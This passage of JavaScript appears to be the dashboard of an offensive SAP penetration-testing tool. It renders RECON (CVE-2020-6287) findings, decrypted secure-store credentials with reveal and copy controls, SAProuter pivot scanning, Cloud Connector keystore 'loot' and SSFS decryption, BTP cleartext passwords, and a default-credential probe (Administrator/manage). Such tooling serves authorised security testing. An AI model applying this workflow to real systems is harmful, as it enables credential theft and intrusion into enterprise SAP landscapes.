      ${(n.system_type || '').toUpperCase().indexOf('JAVA') !== -1 ? `
      <div class="detail-row"><span class="detail-key">CVE-2020-6287</span><span class="detail-val">${
        n.cve_2020_6287_vulnerable
          ? `<span style="color:#f85149">YES — RECON unauth admin (port ${n.cve_2020_6287_port}${n.cve_2020_6287_https ? ' HTTPS' : ''})</span>`
          : n.cve_2020_6287_checked
            ? `<span style="color:#3fb950">Not vulnerable</span><span style="color:#8b949e"> · ${escHtml(n.cve_2020_6287_evidence || '')}</span>`
            : 'Not checked'
      }</span></div>` : ''}
      ${n.saprouter ? `<div class="detail-row"><span class="detail-key">SAProuter</span><span class="detail-val" style="color:#d29922">${escHtml(n.saprouter)}</span></div>` : ''}
      ${n.java_secstore_checked ? `
      <div class="detail-row"><span class="detail-key">Java Secure Store</span><span class="detail-val">${
        (() => {
          // Apply the same noise filter the modal uses by default, so
          // the summary counts match what the operator actually sees.
          const isNoise = (e) => {
            const nm = e.name || '';
            return /childinstance/i.test(nm)
                || /^#~data-source-aliases\.xml$/i.test(nm)
                || /^#~secured property/i.test(nm)
                || (e.kind || '').toLowerCase() === 'undecryptable';
          };
          const visible = (n.java_secstore_entries || []).filter(e => !isNoise(e));
          const hidden  = (n.java_secstore_entries || []).length - visible.length;
          const fe = visible.filter(e => (e.source || '') === 'SecStore.properties').length;
          const ce = visible.filter(e => (e.source || '').startsWith('J2EE_CONFIGENTRY')).length;
          const ds = Array.from(new Set(visible.filter(e => e.is_downstream).map(e => e.target_sid))).filter(Boolean);
          return `<span style="color:#f85149">${visible.length} entries decrypted</span>` +
                 ` <span style="color:#8b949e">(${fe} file · ${ce} configentry` +
                 (ds.length ? ` · downstream: ${escHtml(ds.join(', '))}` : '') +
                 (hidden ? ` · ${hidden} noise hidden` : '') +
                 `)</span> · alg=${escHtml((n.java_secstore_algorithm || '').slice(0, 60))}` +
                 ` <a href="javascript:void(0)" onclick="showJavaSecStoreModal('${escHtml(n.sid)}')" style="color:#58a6ff">view all →</a>`;
        })()
      }</span></div>` : ''}
    </div>
    ${n.java_secstore_checked && (n.java_secstore_entries || []).length ? `
    <div class="detail-section" style="user-select:text;-webkit-user-select:text">
      <h4 style="margin:0 0 8px;color:#f0883e">&#128273; Java Secure Store entries</h4>
      <div style="font-size:10px;color:#8b949e;margin-bottom:6px">Click a row to copy the value · <a href="javascript:void(0)" onclick="showJavaSecStoreModal('${escHtml(n.sid)}')" style="color:#58a6ff">open full modal</a></div>
      <table style="width:100%;border-collapse:collapse;font-family:monospace;font-size:11px;user-select:text">
        <thead><tr style="color:#8b949e;border-bottom:1px solid #30363d">
          <th style="text-align:left;padding:3px 6px">Source</th>
          <th style="text-align:left;padding:3px 6px">Name</th>
          <th style="text-align:left;padding:3px 6px">Value</th>
        </tr></thead>
        <tbody>
        ${(() => {
          // Same noise filter as the modal + summary.  We render up
          // to 25 non-noise rows inline so the operator sees real
          // credentials without opening the modal.
          const isNoise = (e) => {
            const nm = e.name || '';
            return /childinstance/i.test(nm)
                || /^#~data-source-aliases\.xml$/i.test(nm)
                || /^#~secured property/i.test(nm)
                || (e.kind || '').toLowerCase() === 'undecryptable';
          };
          const visible = (n.java_secstore_entries || []).filter(e => !isNoise(e));
          const head = visible.slice(0, 25);
          const overflow = visible.length - head.length;
          const body = head.map(e => {
            const isPw = /pass|pwd|secret|credential/i.test(e.name || '');
            let v = e.value || '';
            if (isPw && v.length > 0) v = '•'.repeat(Math.min(v.length, 8)) + ' (' + v.length + 'B)';
            v = String(v).replace(/(password\s*=)[^&;\s]+/gi, '$1***');
            if (v.length > 200) v = v.slice(0, 200) + '… [open full modal]';
            const ds = e.is_downstream ? ' style="color:#f85149"' : '';
            return `<tr${ds}>` +
              `<td style="padding:3px 6px;color:#8b949e">${escHtml((e.source || '').replace('SecStore.properties', 'file').replace('J2EE_CONFIGENTRY', 'cfg'))}</td>` +
              `<td style="padding:3px 6px">${escHtml(e.name)}</td>` +
              `<td style="padding:3px 6px;word-break:break-all">${escHtml(v)}</td>` +
            `</tr>`;
          }).join('');
          const more = overflow > 0
            ? `<tr><td colspan="3" style="padding:6px;color:#8b949e;text-align:center">… ${overflow} more — open full modal</td></tr>`
            : '';
          const emptyNote = visible.length === 0
            ? `<tr><td colspan="3" style="padding:6px;color:#8b949e;text-align:center;font-style:italic">All ${(n.java_secstore_entries || []).length} entries filtered as noise — open the modal and tick "Show noise" to inspect</td></tr>`
            : '';
          return body + more + emptyNote;
        })()}
        </tbody>
      </table>
    </div>` : ''}
    ${(() => {
      const ri = n.saprouter_info || {};
      if (!ri.vulnerable) return '';
      const sid = n.sid;
      const clients = ri.clients || [];
      // Build connection table (mirrors "saprouter -l" output)
      const connTable = clients.length === 0
        ? '<div style="color:#484f58;font-size:11px;margin:4px 0">No active connections</div>'
        : '<table style="width:100%;border-collapse:collapse;font-family:monospace;font-size:11px;margin:6px 0">' +
          '<thead><tr style="color:#8b949e;border-bottom:1px solid #30363d">' +
          '<th style="text-align:right;padding:2px 8px 2px 0;white-space:nowrap">ID</th>' +
          '<th style="text-align:left;padding:2px 8px">CLIENT</th>' +
          '<th style="text-align:left;padding:2px 8px">PARTNER</th>' +
          '<th style="text-align:right;padding:2px 0">service</th>' +
          '</tr></thead><tbody>' +
          clients.map(c => {
            const hasPartner = c.partner && c.partner !== '(no partner)';
            const partnerCol = hasPartner
              ? '<span style="color:#58a6ff">' + escHtml(c.partner) + '</span>'
              : '<span style="color:#484f58">(no partner)</span>';
            const svcCol = c.service
              ? '<span style="color:#3fb950">' + escHtml(c.service) + '</span>'
              : '<span style="color:#484f58">—</span>';
            const srcCol = c.ip && c.ip !== c.source
              ? escHtml(c.source) + ' <span style="color:#484f58">(' + escHtml(c.ip) + ')</span>'
              : '<span style="color:#d29922">' + escHtml(c.source || '?') + '</span>';
            return '<tr style="border-bottom:1px solid #21262d">' +
              '<td style="text-align:right;padding:3px 8px 3px 0;color:#484f58">' + escHtml(String(c.id ?? '')) + '</td>' +
              '<td style="padding:3px 8px">' + srcCol + '</td>' +
              '<td style="padding:3px 8px">' + partnerCol + '</td>' +
              '<td style="text-align:right;padding:3px 0">' + svcCol + '</td>' +
              '</tr>';
          }).join('') +
          '</tbody></table>';
      return '<div class="detail-section">' +
        '<h4 style="color:#f85149">&#128268; SAProuter Info Leak (Vulnerable!)</h4>' +
        '<div class="detail-row"><span class="detail-key">Working Dir</span><span class="detail-val">' + escHtml(ri.working_dir || '?') + '</span></div>' +
        '<div class="detail-row"><span class="detail-key">Routtab</span><span class="detail-val">' + escHtml(ri.routtab || '?') + '</span></div>' +
        '<div class="detail-row"><span class="detail-key">Connections</span><span class="detail-val">' + (ri.total_clients || clients.length || 0) + '</span></div>' +
        connTable +
        '<div style="margin-top:8px"><button class="btn btn-primary" style="font-size:11px;padding:3px 10px" onclick="selectedNodeSid=\'' + escHtml(sid) + '\';showRouterScanModal(\'' + escHtml(sid) + '\')">&#128270; Scan Internally via this SAProuter</button></div>' +
        '</div>';
    })()}
    <div class="detail-section">
      <h4>Instances</h4>
      ${(n.instances || []).map(i => {
        const ports = Object.keys(i.ports||{}).sort((a,b)=>a-b).join(', ');
        return `<div class="detail-row"><span class="detail-key">Inst ${escHtml(i.instance_nr)}</span><span class="detail-val">${escHtml(i.ip)}${ports ? ' — Ports: '+ports : ''}</span></div>`;
      }).join('')}
    </div>
    <div class="detail-section">
      <h4>Open Ports</h4>
      ${(() => {
        const allPorts = new Set();
        for (const inst of (n.instances || [])) for (const p of Object.keys(inst.ports || {})) allPorts.add(parseInt(p));
        if (allPorts.size === 0) return '<div style="color:#484f58">None detected</div>';
        return [...allPorts].sort((a,b)=>a-b).map(p => `<span style="display:inline-block;background:#21262d;border:1px solid #30363d;border-radius:4px;padding:1px 6px;margin:2px;font-size:11px;font-family:monospace">${p}</span>`).join('');
      })()}
    </div>
    <div class="detail-section">
      <h4>Clients</h4>
      ${(n.clients || []).map(c => { const nr = typeof c === 'object' ? (c.nr||'?') : String(c); const cat = typeof c === 'object' ? (c.category||'') : ''; const roleMap = {P:'Production',S:'SAP Reference Client',T:'Test',C:'Customising',D:'Demo',E:'Training'}; const label = roleMap[cat]; return `<div class="detail-row"><span class="detail-key">${escHtml(nr)}</span><span class="detail-val">${cat === 'P' ? '<span style="color:#f85149">Production</span>' : label ? escHtml(label) : escHtml(cat)}</span></div>`; }).join('') || '<div style="color:#484f58">None enumerated</div>'}
    </div>
    <div class="detail-section">
      <h4>Created Users (${(n.created_users||[]).length})</h4>
      ${(n.created_users || []).map(u => `<div class="detail-row"><span class="detail-key">${escHtml(u.username)}</span><span class="detail-val">Client ${escHtml(u.client)} via ${escHtml(u.method)}</span></div>`).join('') || '<div style="color:#484f58">None</div>'}
    </div>
    ${(() => {
      const ss = n.secstore_entries || [];
      if (ss.length === 0) return '';
      const catColors = {rfc:'#f0883e',db:'#58a6ff',cts:'#3fb950',smtp:'#bc8cff',hmac:'#484f58',pse:'#484f58',oauth2_client:'#a371f7',other:'#484f58'};
      const catLabels = {rfc:'RFC',db:'DB',cts:'CTS',smtp:'SMTP',hmac:'HMAC',pse:'PSE',oauth2_client:'OAuth',other:'?'};
      return '<div class="detail-section"><h4>&#128273; SecStore (' + ss.length + ' entries)</h4>' +
        ss.filter(e => !e.error).map(e => {
          const cat = e.category || 'other';
          const col = catColors[cat] || '#484f58';
          const lbl = catLabels[cat] || '?';
          const pwd = e.password || '';
          const plen = e.password_len || pwd.length || 0;
          const masked = plen > 0 ? '&#9679;'.repeat(Math.min(plen, 8)) + ' (' + plen + ' chars)' : '(empty)';
          const ident = e.ident_clean || e.ident || '?';
          return '<div class="detail-row ss-reveal" style="cursor:pointer">' +
            '<span class="detail-key" style="color:' + col + ';min-width:50px">' + lbl + '</span>' +
            '<span class="detail-val" style="font-size:11px">' + escHtml(ident) +
            '<br><span class="ss-masked" style="color:#8b949e">' + masked + '</span>' +
            '<span class="ss-plain" style="display:none;color:#3fb950">' + escHtml(pwd) + '</span>' +
            '</span></div>';
        }).join('') +
        '</div>';
    })()}
    ${(() => {
      const ir = n.impact_results || [];
      const withData = ir.filter(r => r.record_count > 0);
      if (withData.length === 0) return '';
      const sevColors = { 5:'#e74c3c', 4:'#e67e22', 3:'#f1c40f', 2:'#3498db', 1:'#95a5a6' };
      return '<div class="detail-section"><h4 style="cursor:pointer" onclick="showImpactDetail(\'' + escHtml(n.sid) + '\')">&#128200; Business Impact (' + withData.length + ' findings) &#8594;</h4>' +
        withData.slice(0, 3).map(r => {
          const col = sevColors[r.severity] || '#95a5a6';
          return '<div class="detail-row"><span class="detail-key" style="color:' + col + '">' + (r.icon||'') + '</span><span class="detail-val" style="font-size:11px">' + escHtml(r.headline) + '</span></div>';
        }).join('') +
        (withData.length > 3 ? '<div style="font-size:11px;color:#58a6ff;cursor:pointer;margin-top:4px" onclick="showImpactDetail(\'' + escHtml(n.sid) + '\')">+ ' + (withData.length - 3) + ' more &rarr;</div>' : '') +
        '</div>';
    })()}
    ${(() => {
      const cr = n.capability_results || [];
      if (cr.length === 0) return '';
      const tierColors = {5:'#e74c3c', 4:'#e67e22', 3:'#f1c40f', 2:'#3498db', 1:'#95a5a6'};
      return '<div class="detail-section"><h4>&#128202; User Capability Inventory ('
        + cr.length + ' user' + (cr.length === 1 ? '' : 's') + ')</h4>'
        + cr.map(r => {
            const caps = r.capabilities || [];
            const top = caps.slice(0, 4);
            const more = caps.length - top.length;
            const userBadge = '<b style="color:#f0883e">' + escHtml(r.username)
                            + '</b>@<span style="color:#8b949e">'
                            + escHtml(r.client) + '</span>';
            const blast = '<span style="font-size:10px;color:#8b949e">'
                        + escHtml(r.blast_radius || '') + '</span>';
            const head = '<div style="margin:6px 0 4px">' + userBadge + '<br>' + blast + '</div>';
            const list = top.map(c => {
                const col = tierColors[c.severity] || '#95a5a6';
                const tbls = (c.tables || []).slice(0, 3).join(', ')
                           + ((c.tables || []).length > 3
                              ? ' +' + ((c.tables || []).length - 3) : '');
                return '<div class="detail-row" title="' + escHtml(c.why || '') + '">'
                    + '<span class="detail-key" style="color:' + col + ';min-width:46px">'
                    + escHtml(c.auth_object) + '</span>'
                    + '<span class="detail-val" style="font-size:11px">'
                    + escHtml(c.capability)
                    + '<br><span style="color:#6e7681;font-size:10px">'
                    + escHtml(tbls) + '</span></span></div>';
            }).join('');
            const tail = more > 0
              ? '<div style="font-size:10px;color:#6e7681;margin:4px 0 0">+ '
                + more + ' more capability' + (more === 1 ? '' : 'ies') + '</div>'
              : '';
            return head + list + tail;
        }).join('<hr style="border:0;border-top:1px solid #30363d;margin:8px 0">')
        + '</div>';
    })()}
  `;

  // Wire up click-to-reveal on SecStore entries
  panel.querySelectorAll('.ss-reveal').forEach(row => {
    row.addEventListener('click', () => {
      const m = row.querySelector('.ss-masked');
      const p = row.querySelector('.ss-plain');
      if (m.style.display === 'none') { m.style.display = ''; p.style.display = 'none'; }
      else { m.style.display = 'none'; p.style.display = ''; }
    });
  });

  panel.classList.add('visible');
}

// SAP Cloud Connector — read-only detail drawer (Week 1: no actions yet).
function showSCCDetail(host) {
  const sn = (mapState.scc_nodes || {})[host];
  if (!sn) return;
  const panel = document.getElementById('detail-panel');
  if (panel.classList.contains('visible') && panel.dataset.sid === 'scc:' + host) {
    panel.classList.remove('visible');
    return;
  }
  panel.dataset.sid = 'scc:' + host;
  const tls = sn.tls_fingerprint || {};
  const cves = [].concat(sn.cves_confirmed || [], sn.cves_suspected || []);
  panel.innerHTML = `
    <span class="close-btn" onclick="this.parentElement.classList.remove('visible')">&times;</span>
    <h3>&#9729; SAP Cloud Connector — ${escHtml(host)}</h3>
    <div class="detail-section">
      <div class="detail-row"><span class="detail-key">Host</span><span class="detail-val">${escHtml(sn.host || host)}</span></div>
      <div class="detail-row"><span class="detail-key">Admin UI</span><span class="detail-val">https://${escHtml(host)}:${sn.admin_ui_port || 8443}/scc/ui</span></div>
      <div class="detail-row"><span class="detail-key">Version</span><span class="detail-val">${escHtml(sn.version || 'unknown')}${sn.version_source ? ' <span style="color:#8b949e">(' + escHtml(sn.version_source) + ')</span>' : ''}</span></div>
      <div class="detail-row"><span class="detail-key">Server hdr</span><span class="detail-val">${escHtml(sn.server_header || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">UI reachable</span><span class="detail-val">${sn.admin_ui_reachable ? '<span style="color:#3fb950">Yes</span>' : 'No'}</span></div>
      <div class="detail-row"><span class="detail-key">Pwned</span><span class="detail-val">${sn.pwned ? '<span style="color:#f0883e">&#9889; YES</span>' : 'No'}</span></div>
    </div>
    <div class="detail-section">
      <h4>TLS Fingerprint</h4>
      <div class="detail-row"><span class="detail-key">Protocol</span><span class="detail-val">${escHtml(tls.tls_version || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Cipher</span><span class="detail-val">${escHtml(tls.cipher || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">ALPN</span><span class="detail-val">${escHtml(tls.alpn || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Subject</span><span class="detail-val" style="font-size:10px;word-break:break-all">${escHtml(tls.cert_subject || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Issuer</span><span class="detail-val" style="font-size:10px;word-break:break-all">${escHtml(tls.cert_issuer || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">SAN</span><span class="detail-val" style="font-size:10px">${escHtml((tls.cert_san || []).join(', ') || '?')}</span></div>
    </div>
    <div class="detail-section">
      <h4>Fingerprints</h4>
      <div class="detail-row"><span class="detail-key">Bundle</span><span class="detail-val" style="font-family:monospace;font-size:11px">${escHtml(sn.bundle_hash || '—')}</span></div>
      <div class="detail-row"><span class="detail-key">Favicon SHA256</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all">${escHtml((sn.favicon_sha256 || '').slice(0, 32) + ((sn.favicon_sha256 || '').length > 32 ? '…' : ''))}</span></div>
      <div class="detail-row"><span class="detail-key">Favicon mmh3</span><span class="detail-val">${sn.favicon_mmh3 || '—'}</span></div>
    </div>
    ${cves.length ? `
    <div class="detail-section">
      <h4>CVE buckets <span style="color:#8b949e;font-weight:normal;font-size:10px">(${(sn.cves_confirmed || []).length} confirmed, ${(sn.cves_suspected || []).length} suspected)</span></h4>
      ${(() => {
        const sevColor = { CRITICAL: '#f85149', HIGH: '#f0883e', MEDIUM: '#d29922', INFO: '#58a6ff' };
        const det = (sn.cve_details || []);
        if (det.length) {
          return det.map(d => {
            const isConf = d.status === 'confirmed';
            const tag = isConf ? 'CONFIRMED' : 'suspected';
            const tagColor = isConf ? '#f85149' : '#d29922';
            const sCol = sevColor[(d.severity || '').toUpperCase()] || '#8b949e';
            return `<div style="border-left:3px solid ${sCol};padding:6px 8px;margin:6px 0;background:#0d1117">
                      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
                        <span style="font-family:monospace;font-weight:bold"><a href="${escHtml(d.ref || '#')}" target="_blank" style="color:#58a6ff;text-decoration:none">${escHtml(d.cve)}</a></span>
                        <span style="font-size:10px"><span style="color:${tagColor};font-weight:bold">${tag}</span> · <span style="color:${sCol}">${escHtml(d.severity || '?')}</span></span>
                      </div>
                      <div style="font-size:11px;color:#cfd9df">${escHtml(d.headline || '')}</div>
                    </div>`;
          }).join('');
        }
        // Legacy fallback (state file from before cve_details existed).
        return (sn.cves_confirmed || []).map(c => `<div class="detail-row"><span class="detail-key" style="color:#f85149">CONFIRMED</span><span class="detail-val" style="font-family:monospace">${escHtml(c)}</span></div>`).join('') +
               (sn.cves_suspected || []).map(c => `<div class="detail-row"><span class="detail-key" style="color:#d29922">suspected</span><span class="detail-val" style="font-family:monospace">${escHtml(c)}</span></div>`).join('');
      })()}
    </div>` : ''}
    ${sn.keystore_extracted ? `
    <div class="detail-section" style="border-left:3px solid #f85149;padding-left:8px">
      <h4 style="color:#f85149">&#128272; Keystore Loot</h4>
      <div class="detail-row"><span class="detail-key">Loot path</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all">${escHtml(sn.keystore_loot_path || '?')}</span></div>
      ${sn.tunnel_privkey_fp ? `<div class="detail-row"><span class="detail-key">System P12 sha256</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all">${escHtml(sn.tunnel_privkey_fp)}</span></div>` : ''}
      ${sn.pp_ca_privkey_fp ? `<div class="detail-row"><span class="detail-key">SSFS sha256</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all" title="SAP Secure Storage File System — contains the principal-propagation CA private key when configured">${escHtml(sn.pp_ca_privkey_fp)}</span></div>` : ''}
      ${sn.ssfs_decrypted ? `
        <div class="detail-row"><span class="detail-key" style="color:#f85149">SSFS</span><span class="detail-val" style="color:#3fb950">DECRYPTED · ${(sn.ssfs_secrets_keys || []).length} secret(s)</span></div>
        <div class="detail-row"><span class="detail-key">Secrets file</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all" title="mode 0600 — review locally, never paste">${escHtml(sn.ssfs_secrets_path || '?')}</span></div>
        <div class="detail-row"><span class="detail-key">Recovered keys</span><span class="detail-val" style="font-family:monospace;font-size:10px">${(sn.ssfs_secrets_keys || []).map(k => escHtml(k)).join('<br>') || '-'}</span></div>
        ${(sn.unlocked_keystores || []).length === 0 ? '' : `
          <div style="margin-top:6px;color:#8b949e;font-size:11px">Unlocked keystores (${(sn.unlocked_keystores || []).length}):</div>
          <table style="width:100%;border-collapse:collapse;margin-top:4px;font-size:11px">
            <thead>
              <tr style="background:#161b22;color:#8b949e;text-align:left">
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Path</th>
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Subject</th>
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Cert sha256</th>
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Key</th>
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Valid until</th>
              </tr>
            </thead>
            <tbody>
              ${(sn.unlocked_keystores || []).map(k => `
                <tr>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace;font-size:10px;word-break:break-all">${escHtml(k.path || '?')}</td>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-size:10px;word-break:break-all">${escHtml(k.cert_subject || k.error || '-')}</td>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace;font-size:10px">${escHtml((k.cert_sha256 || '').slice(0,16))}${k.cert_sha256 ? '…' : ''}</td>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace;font-size:10px">${escHtml(k.key_type || '-')}${k.key_size ? '/' + k.key_size : ''}</td>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-size:10px">${escHtml((k.cert_not_after || '').slice(0,10))}</td>
                </tr>`).join('')}
            </tbody>
          </table>`}
      ` : '<div class="detail-row"><span class="detail-key">SSFS</span><span class="detail-val" style="color:#8b949e">not yet decrypted (right-click → Decrypt SSFS)</span></div>'}
    </div>` : ''}
    ${(sn.ha_role || sn.ha_shadow_host) ? `
    <div class="detail-section">
      <h4>High Availability</h4>
      <div class="detail-row"><span class="detail-key">Role</span><span class="detail-val" style="color:${sn.ha_role === 'master' ? '#3fb950' : (sn.ha_role === 'shadow' ? '#a371f7' : '#8b949e')}">${escHtml((sn.ha_role || 'standalone').toUpperCase())}</span></div>
      ${sn.ha_shadow_host ? `<div class="detail-row"><span class="detail-key">Peer (${escHtml((sn.ha_peer_role || '?').toUpperCase())})</span><span class="detail-val" style="font-family:monospace"><a href="javascript:void(0)" onclick="showSCCDetail('${escHtml(sn.ha_shadow_host)}')" style="color:#58a6ff">${escHtml(sn.ha_shadow_host)}</a></span></div>` : '<div class="detail-row"><span class="detail-key">Peer</span><span class="detail-val" style="color:#8b949e">none (standalone)</span></div>'}
    </div>` : ''}
    <div class="detail-section">
      <h4>Subaccounts &amp; Mappings</h4>
      <div class="detail-row"><span class="detail-key">Region</span><span class="detail-val">${escHtml(sn.tunnel_region || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Subaccount UUIDs</span><span class="detail-val">${(sn.subaccount_uuids || []).map(u => escHtml(u)).join('<br>') || '0'}</span></div>
      <div class="detail-row"><span class="detail-key">Mappings</span><span class="detail-val">${(sn.mappings || []).length}</span></div>
      ${((sn.mappings || []).length === 0) ? '' : `
      <table style="width:100%;border-collapse:collapse;margin-top:6px;font-size:11px">
        <thead>
          <tr style="background:#161b22;color:#8b949e;text-align:left">
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Virtual</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Internal</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Proto</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">SID</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Auth</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d" title="Tunnel-relay smoke test result">Reach</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Resources</th>
          </tr>
        </thead>
        <tbody>
          ${(sn.mappings || []).map(m => {
            const auth = m.authentication_mode || '';
            const ppHi = (auth === 'KERBEROS' || auth === 'X509_GENERAL');
            const resList = (m.path_allowlist || []).filter(r => r && r.path).slice(0, 4)
              .map(r => `<div style="font-family:monospace;color:${(r.policy === 'PATH_AND_ALL_SUB_PATHS' || !r.exact_match_only) ? '#f0883e' : '#cfd9df'}">${escHtml(r.path)}${(r.policy === 'PATH_AND_ALL_SUB_PATHS' || !r.exact_match_only) ? ' /*' : ''}</div>`).join('');
            const moreRes = (m.path_allowlist || []).filter(r => r && r.path).length - 4;
            let reachCell;
            if (m.reachable === true) {
              const sigTip = m.probe_signature ? ' · ' + m.probe_signature : '';
              reachCell = `<span style="color:#3fb950;font-weight:bold" title="${escHtml(m.last_probed_at || '')}${escHtml(sigTip)}">&#10003; ${m.probe_latency_ms || 0}ms</span>`;
            } else if (m.reachable === false) {
              reachCell = `<span style="color:#f85149;font-weight:bold" title="${escHtml(m.probe_error || 'unreachable')}">&#10007; fail</span>`;
            } else {
              reachCell = '<span style="color:#8b949e">—</span>';
            }
            return `
              <tr>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace">${escHtml(m.virtual_host || '?')}:${m.virtual_port || '?'}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace">${escHtml(m.internal_host || '?')}:${m.internal_port || '?'}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d">${escHtml((m.protocol || '').toUpperCase())}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-weight:bold">${escHtml(m.sid || '')}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;color:${ppHi ? '#f0883e' : '#8b949e'}">${escHtml(auth || '-')}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;text-align:center">${reachCell}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d">${resList || '<span style="color:#8b949e">-</span>'}${moreRes > 0 ? `<div style="color:#8b949e;font-size:10px">+ ${moreRes} more</div>` : ''}</td>
              </tr>`;
          }).join('')}
        </tbody>
      </table>`}
    </div>
    <div class="detail-section">
      <h4>Actions</h4>
      <div style="display:flex;flex-direction:column;gap:6px">
        <button class="ctx-btn" onclick="showSCCCredModal('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128273; Set Credentials <span style="color:#8b949e;font-size:10px">(stored, auto-fills pull/extract)</span></button>
        <button class="ctx-btn" onclick="sccProbeCreds('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128273; Probe default creds <span style="color:#8b949e;font-size:10px">(1 POST · Administrator/manage)</span></button>
        <button class="ctx-btn" onclick="sccPullMappings('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128194; Pull mappings <span style="color:#8b949e;font-size:10px">(auto-fills if creds saved)</span></button>
        <button class="ctx-btn" onclick="sccProbeMappings('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128225; Probe mappings <span style="color:#8b949e;font-size:10px">(TCP/HTTP smoke test)</span></button>
        <button class="ctx-btn" onclick="sccExtractKeystore('${escHtml(host)}')" style="background:#21262d;border:1px solid #f85149;color:#f85149;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128272; Extract keystore + decrypt SSFS <span style="color:#8b949e;font-size:10px">(full backup zip — crown jewels)</span></button>
      </div>
    </div>
  `;
  panel.classList.add('visible');
}

function showBTPDetail(uuid) {
  const bn = (mapState.btp_subaccounts || {})[uuid];
  if (!bn) return;
  const panel = document.getElementById('detail-panel');
  if (panel.classList.contains('visible') && panel.dataset.sid === 'btp:' + uuid) {
    panel.classList.remove('visible');
    return;
  }
  panel.dataset.sid = 'btp:' + uuid;
  const dests = bn.destinations || [];
  const cleartext = dests.filter(d => d && d.cleartext_captured);
  const linked = dests.filter(d => d && d.linked_target_sid);
  const destRows = dests.map((d, di) => {
    const flags = [];
    if (d.cleartext_captured) flags.push('<span style="color:#e74c3c;font-weight:bold">CLEARTEXT</span>');
    if (d.linked_target_sid) flags.push('<span style="color:#3fb950">→ ' + escHtml(d.linked_target_sid) + '</span>');
    const pwId = 'btp-pw-' + uuid.slice(0, 8) + '-' + di;
    const pwBlock = d.password ? `
      <div style="font-size:11px;margin-top:4px;display:flex;align-items:center;gap:6px">
        <span style="color:#8b949e">Password:</span>
        <code id="${pwId}" style="background:#161b22;padding:2px 6px;border-radius:3px;font-family:monospace;color:#f85149;user-select:text;word-break:break-all">${escHtml(d.password)}</code>
        <button data-pw="${escHtml(d.password)}" onclick="navigator.clipboard.writeText(this.dataset.pw);this.textContent='copied';setTimeout(()=>this.textContent='copy',1200)" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:2px 8px;border-radius:3px;font-size:10px;cursor:pointer">copy</button>
      </div>` : '';
    return `<div style="border-left:3px solid #5dade2;padding:6px 8px;margin:6px 0;background:#0d1117">
      <div style="font-weight:bold;font-family:monospace">${escHtml(d.name || '?')}</div>
      <div style="font-size:11px;color:#8b949e;font-family:monospace;word-break:break-all">${escHtml(d.url || '')}</div>
      <div style="font-size:11px;color:#8b949e">Auth: ${escHtml(d.authentication || '?')}${d.user ? ' · User: ' + escHtml(d.user) : ''}</div>
      ${pwBlock}
      ${flags.length ? '<div style="font-size:11px;margin-top:4px">' + flags.join(' · ') + '</div>' : ''}
    </div>`;
  }).join('');
  panel.innerHTML = `
    <span class="close-btn" onclick="this.parentElement.classList.remove('visible')">&times;</span>
    <h3>&#9729; BTP Subaccount — ${escHtml(bn.display_name || bn.subdomain || uuid.slice(0, 8))}</h3>
    <div class="detail-section">
      <div class="detail-row"><span class="detail-key">UUID</span><span class="detail-val" style="font-family:monospace;font-size:11px;word-break:break-all">${escHtml(uuid)}</span></div>
      <div class="detail-row"><span class="detail-key">Region</span><span class="detail-val">${escHtml(bn.region || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Subdomain</span><span class="detail-val">${escHtml(bn.subdomain || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Global account</span><span class="detail-val">${escHtml(bn.parent_global_account || '—')}</span></div>
      <div class="detail-row"><span class="detail-key">Pwned</span><span class="detail-val">${bn.pwned ? '<span style="color:#f0883e">&#9889; YES</span>' : 'No'}</span></div>
